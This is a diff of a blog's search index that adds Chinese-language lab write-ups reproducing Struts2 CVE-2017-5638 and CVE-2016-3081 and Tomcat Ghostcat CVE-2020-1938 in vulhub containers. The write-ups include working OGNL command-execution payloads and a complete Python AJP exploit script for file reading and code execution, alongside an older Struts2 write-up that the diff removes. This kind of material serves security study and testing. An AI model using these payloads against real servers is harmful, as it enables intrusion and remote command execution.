-        <category>漏洞</category>
-      </categories>
-      <tags>
-        <tag>CVE</tag>
-        <tag>Tomcat</tag>
       </tags>
   </entry>
   <entry>
@@ -345,42 +281,34 @@
       </tags>
   </entry>
   <entry>
-    <title>Struts2 远程代码执行漏洞 CVE-2018-11776</title>
-    <url>/2026/02/04/CVE-2018-11776/</url>
+    <title>Struts2 远程代码执行漏洞 CVE-2017-5638</title>
+    <url>/2026/02/04/CVE-2017-5638/</url>
     <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
-<li>Struts 2.3 – 2.3.34  </li>
-<li>Struts 2.5 – 2.5.16</li>
+<li>Struts 2.3.5 – 2.3.31</li>
+<li>Struts 2.5 – 2.5.10</li>
 </ul>
 <h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>OGNL 表达式注入</p>
 <h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>无</p>
-<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><ul>
-<li>alwaysSelectFullNamespace 设置为 true</li>
-<li>package 标签未定义 namespace 或使用了通配符</li>
-</ul>
+<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><p>默认配置</p>
 <h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>执行命令，可以执行各种敏感操作，例如任意文件读取，植入木马，内网探测</p>
-<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>Struts2 将 URL 路径中的 namespace 当作 OGNL 表达式，在重定向跳转时对其进行二次解析，执行敏感命令。Struts2 中的 URL 结构通常为 http://域名/命名空间/Action 名.action，如果攻击者访问不存在的命名空间，且配置了 alwaysSelectFullNamespace = true，那么会将攻击者注入的 payload 提取出来，将动态变量赋值为攻击 payload，OGNL 引擎解析命名空间时候执行了恶意 payload</p>
+<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>漏洞产生主要原因是 Struts2 有一个复杂功能，给错误信息赋动态变量，构造的 payload 通过错误信息进入到动态变量，后续通过动态变量抛出报错信息同时执行敏感命令。Struts2 默认使用 Jakarta 库来解析上传文件，通过构造异常的 Content-Type，Jakarta 解析器无法识别并抛出该字符串错误，Struts2 将错误转化为可读错误提示，findText () 函数解析时候，错误信息内有 %(# 符号，识别为需要计算的表达式，OGNL 引擎解析并执行括号里面的 Java 代码，即敏感命令</p>
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>用现成的 vulhub 来拉取镜像</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/struts2/s2-057</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/struts2/s2-045</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
 
-<p><img src="1773323657480.png" alt="1773323657480"></p>
-<p>用 burpsuite 抓取 http://公网: 8080/struts2-showcase 数据包</p>
-<p><img src="1773323699382.png" alt="1773323699382">发送到 Repeater 模块<br><img src="1773323750416.png" alt="1773323750416"></p>
-<p>将 URL 访问改成下面 payload，即在原本基础上添加即可，这里用 ${(777 * 777)} 是为了验证漏洞，下面对 payload 的特殊符号已经进行 url 编码</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">/struts2-showcase/%24%7B%28777%2A777%29%7D/actionChain1.action</span><br></pre></td></tr></tbody></table></figure>
+<p>可以通过 docker ps 查看镜像</p>
+<p><img src="1773317613909.png" alt="1773317613909"></p>
+<p>用 burpsuite 抓取 http://公网: 8080 流量包</p>
+<p><img src="1773317657503.png" alt="1773317657503"></p>
+<p>使用 Repeater 模块</p>
+<p><img src="1773317777800.png" alt="1773317777800"></p>
+<p>随便添加参数</p>
+<p><img src="1773317706752.png" alt="1773317706752"></p>
+<p>修改 Content-Type 内容，换成下面的恶意 payload，并删掉加入的参数</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">%{(#nick='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmds={'id'}).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}</span><br></pre></td></tr></tbody></table></figure>
 
-<p><img src="1773323786334.png" alt="1773323786334"></p>
-<p>响应码为 302，点击跟随重定向</p>
-<p><img src="1773323830540.png" alt="1773323830540"></p>
-<p>原链接出现了计算结果，执行了 OGNL 表达式，说明存在注入点</p>
-<p><img src="1773323872780.png" alt="1773323872780"></p>
-<p>下面执行更加敏感的命令，替换掉上面 ${(777 * 777)} 的位置</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27id%27%29%29.%28@org.apache.commons.io.IOUtils@toString%28%23a.getInputStream%28%29%29%29%7D</span><br></pre></td></tr></tbody></table></figure>
-
-<p><img src="1773323920618.png" alt="1773323920618"></p>
-<p>响应码 302，进行重定向</p>
-<p><img src="1773323963853.png" alt="1773323963853"></p>
-<p>出现敏感命令执行的结果</p>
-<p><img src="1773324000078.png" alt="1773324000078"></p>
+<p><img src="1773317824744.png" alt="1773317824744"></p>
+<p>发送后，响应码为 200，且执行了命令 id</p>
+<p><img src="1773317875838.png" alt="1773317875838"></p>
 ]]></content>
       <categories>
         <category>漏洞</category>
@@ -388,6 +316,78 @@
       <tags>
         <tag>CVE</tag>
         <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Struts2 远程命令执行漏洞 CVE-2016-3081</title>
+    <url>/2026/02/03/CVE-2016-3081/</url>
+    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
+<li>Struts 2.3.18 - 2.3.28（不包括 2.3.20.2 和 2.3.24.2）</li>
+</ul>
+<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>OGNL 表达式注入</p>
+<h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>无</p>
+<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><p>默认配置</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>执行命令，可以执行各种敏感操作，例如任意文件读取，植入木马，内网探测</p>
+<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p>在配置文件 struts.xml 开启了 devMode（开发者模式），其中允许通过 method 前缀来动态执行 Action 方法。Struts2 内部存在一个安全沙盒，默认禁止执行危险的 Java 方法，为允许调用执行系统命令所需 Java 类，将上下文访问权限重置为默认，payload 片段为 #_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS。权限限制接触后，攻击者通过调用 Java 环境的 Runtime 环境执行系统级别的命令，payload 片段为 @java.lang.Runtime@getRuntime ().exec(‘id’)，其中 id 可替换成其他敏感命令  </p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>用现成的 vulhub 来拉取镜像</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#下载vulhub源代码</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">#进入漏洞目录</span><br><span class="line">cd vulhub/struts2/s2-032</span><br><span class="line">#拉取镜像</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="1773316738135.png" alt="1773316738135"></p>
+<p>用 burpsuite 抓取 http://公网: 8080/index.action 流量包</p>
+<p><img src="1773316931101.png" alt="1773316931101"></p>
+<p>发送到 Repeater 模块</p>
+<p><img src="1773316855000.png" alt="1773316855000"></p>
+<p>加上参数 payload</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&amp;pp=%5C%5CA&amp;ppp=%20&amp;encoding=UTF-8&amp;cmd=id</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="1773316979886.png" alt="1773316979886"></p>
+<p>成功执行命令 id</p>
+<p><img src="1773317026124.png" alt="1773317026124"></p>
+]]></content>
+      <categories>
+        <category>漏洞</category>
+      </categories>
+      <tags>
+        <tag>CVE</tag>
+        <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Tomcat 文件包含漏洞 CVE-2020-1938</title>
+    <url>/2026/02/12/CVE-2020-1938/</url>
+    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul>
+<li>Apache Tomcat 6.x (全版本受影响)</li>
+<li>Apache Tomcat 7.0.0 - 7.0.99</li>
+<li>Apache Tomcat 8.5.0 - 8.5.50</li>
+<li>Apache Tomcat 9.0.0.M1 - 9.0.30</li>
+</ul>
+<h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>二进制解析漏洞</p>
+<h2 id="操作系统限制"><a href="#操作系统限制" class="headerlink" title="操作系统限制"></a>操作系统限制</h2><p>无</p>
+<h2 id="配置要求"><a href="#配置要求" class="headerlink" title="配置要求"></a>配置要求</h2><p>8009 端口打开</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul>
+<li>任意文件读取，例如读取 WEB - INF / web.xml 文件，只能读取使用 AJP 目录下的文件</li>
+<li>文件包含，RCE 远程代码执行，可以是反弹 shell</li>
+</ul>
+<h2 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h2><p> AJP 协议默认监听端口通常缺乏认证，利用协议缺陷，伪造 javax.servlet.include 属性</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#拉取镜像</span><br><span class="line">docker run -d -p 8082:8080 -p 8009:8009 --name ghostcat-vulhub vulhub/tomcat:9.0.30</span><br></pre></td></tr></tbody></table></figure>
+
+<p>使用云服务器：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#写入攻击脚本</span><br><span class="line">cat &lt;&lt; 'EOF' &gt; ghostcat.py</span><br><span class="line">import socket</span><br><span class="line">import struct</span><br><span class="line"></span><br><span class="line">def pack_string(s):</span><br><span class="line">    if s is None: return struct.pack('&gt;H', 0xffff)</span><br><span class="line">    b = s.encode('utf-8')</span><br><span class="line">    return struct.pack('&gt;H', len(b)) + b + b'\x00'</span><br><span class="line"></span><br><span class="line">def exploit(target_host, target_port, file_path):</span><br><span class="line">    # AJP13 Forward Request Header</span><br><span class="line">    # 0x02 = Forward Request, 0x02 = GET Method</span><br><span class="line">    data = b'\x02\x02' </span><br><span class="line">    data += pack_string("HTTP/1.1")</span><br><span class="line">    data += pack_string("/index.jsp")</span><br><span class="line">    data += pack_string("127.0.0.1")</span><br><span class="line">    data += pack_string(None)</span><br><span class="line">    data += pack_string("127.0.0.1")</span><br><span class="line">    data += struct.pack('&gt;H', 80)</span><br><span class="line">    data += b'\x00' # is_ssl: false</span><br><span class="line">    data += struct.pack('&gt;H', 0) # num_headers: 0</span><br><span class="line"></span><br><span class="line">    # 注入核心：Ghostcat 必备的三个属性</span><br><span class="line">    attrs = [</span><br><span class="line">        ("javax.servlet.include.request_uri", "/"),</span><br><span class="line">        ("javax.servlet.include.path_info", file_path),</span><br><span class="line">        ("javax.servlet.include.servlet_path", "/")</span><br><span class="line">    ]</span><br><span class="line">    </span><br><span class="line">    for name, value in attrs:</span><br><span class="line">        data += b'\x0a' # SC_A_REQ_ATTRIBUTE</span><br><span class="line">        data += pack_string(name)</span><br><span class="line">        data += pack_string(value)</span><br><span class="line">    </span><br><span class="line">    data += b'\xff' # terminator</span><br><span class="line"></span><br><span class="line">    # 封装 AJP 头部</span><br><span class="line">    header = b'\x12\x34'</span><br><span class="line">    msg_len = struct.pack('&gt;H', len(data))</span><br><span class="line">    packet = header + msg_len + data</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.settimeout(5)</span><br><span class="line">        s.connect((target_host, target_port))</span><br><span class="line">        s.sendall(packet)</span><br><span class="line">        </span><br><span class="line">        print(f"[*] Attacking {target_host}:{target_port} -&gt; {file_path}")</span><br><span class="line">        </span><br><span class="line">        while True:</span><br><span class="line">            res = s.recv(8192)</span><br><span class="line">            if not res: break</span><br><span class="line">            # 过滤掉 AJP 协议的二进制头，直接输出内容</span><br><span class="line">            print(res.decode('utf-8', errors='ignore'))</span><br><span class="line">        s.close()</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f"[!] Error: {e}")</span><br><span class="line"></span><br><span class="line">if __name__ == "__main__":</span><br><span class="line">    import sys</span><br><span class="line">    host = sys.argv[1] if len(sys.argv) &gt; 1 else '127.0.0.1'</span><br><span class="line">    path = sys.argv[2] if len(sys.argv) &gt; 2 else '/WEB-INF/web.xml'</span><br><span class="line">    exploit(host, 8009, path)</span><br><span class="line">EOF</span><br><span class="line">#运行脚本获取xml文件</span><br><span class="line">python3 ghostcat.py 公网 /WEB-INF/web.xml</span><br></pre></td></tr></tbody></table></figure>
+
+<p>成功复现读取/WEB - INF/web.xml 文件</p>
+<p><img src="1773154158887.png" alt="1773154158887"></p>
+<p>后续进行文件包含，因为靶场环境是纯净的 tomcat，实际环境需要寻找上传点上传木马文件，这里直接写入到靶场中</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#写入敏感文件</span><br><span class="line">docker exec ghostcat-vulhub bash -c 'echo "&lt;% out.println(\"SUCCESS_RCE\"); %&gt;" &gt; /usr/local/tomcat/webapps/ROOT/proof.txt'</span><br><span class="line">#文件包含，并不是简单的txt，里面含有java代码，将静态文本强制解析为Java代码</span><br><span class="line">python3 ghostcat.py 公网 /proof.txt</span><br></pre></td></tr></tbody></table></figure>
+
+<p>出现 SUCCESS_RCE 表明成功实现文件包含，执行了代码</p>
+<p><img src="1773154229210.png" alt="1773154229210"></p>
+]]></content>
+      <categories>
+        <category>漏洞</category>
+      </categories>
+      <tags>
+        <tag>CVE</tag>
+        <tag>Tomcat</tag>
       </tags>
   </entry>
 </search>
